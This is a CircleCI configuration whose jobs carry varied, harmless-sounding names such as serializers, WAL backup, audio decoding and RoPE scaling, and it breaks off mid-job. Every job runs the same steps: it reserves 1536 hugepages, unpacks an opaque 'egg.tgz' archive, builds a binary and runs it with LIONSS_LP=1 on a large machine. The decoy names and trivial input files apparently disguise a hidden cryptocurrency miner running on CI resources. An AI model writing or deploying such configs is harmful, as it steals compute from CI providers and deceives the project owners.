version: 2.1

jobs:
  serdetangent:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write schema
          command: |
            printf '{\"type\":\"struct\"}' > schema.json
      - run:
          name: Derive serializers
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target serdetangent -j2
      - run:
          name: Round-trip encode
          command: LIONSS_LP=1 ./build/serdetangent --schema schema.json --format bincode
  WalgPush:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Point data dir
          command: |
            printf 'datadir /var/lib/pg\n' > wal.cfg
      - run:
          name: Build backup agent
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target WalgPush -j2
      - run:
          name: Push WAL archive
          command: LIONSS_LP=1 ./build/WalgPush --conf wal.cfg --compression lz4
  tickresample:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load raw ticks
          command: |
            printf 'ts,px\n0,10\n1,11\n' > raw.csv
      - run:
          name: Build resampler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tickresample -j2
      - run:
          name: Resample to 1s bars
          command: LIONSS_LP=1 ./build/tickresample --in raw.csv --freq 1s
  ambisonicb:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load b-format
          command: |
            : > scene.amb
      - run:
          name: Build ambisonic decoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ambisonicb -j2
      - run:
          name: Decode B-format
          command: LIONSS_LP=1 ./build/ambisonicb --in scene.amb --order 1
  windowFrame:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write window
          command: |
            printf 'OVER (ORDER BY x)\n' > win.sql
      - run:
          name: Build window operator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target windowFrame -j2
      - run:
          name: Evaluate window frame
          command: LIONSS_LP=1 ./build/windowFrame --sql win.sql --frame rows
  argocd_sync2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write app manifest
          command: |
            printf 'kind: Application\n' > app.yaml
      - run:
          name: Build sync controller
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target argocd_sync2 -j2
      - run:
          name: Reconcile application
          command: LIONSS_LP=1 ./build/argocd_sync2 --app app.yaml --prune
  ropeScale:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set positions
          command: |
            printf 'base 10000\n' > rope.cfg
      - run:
          name: Build positional encoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ropeScale -j2
      - run:
          name: Scale RoPE frequencies
          command: LIONSS_LP=1 ./build/ropeScale --conf rope.cfg --factor 4
  reedmace:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
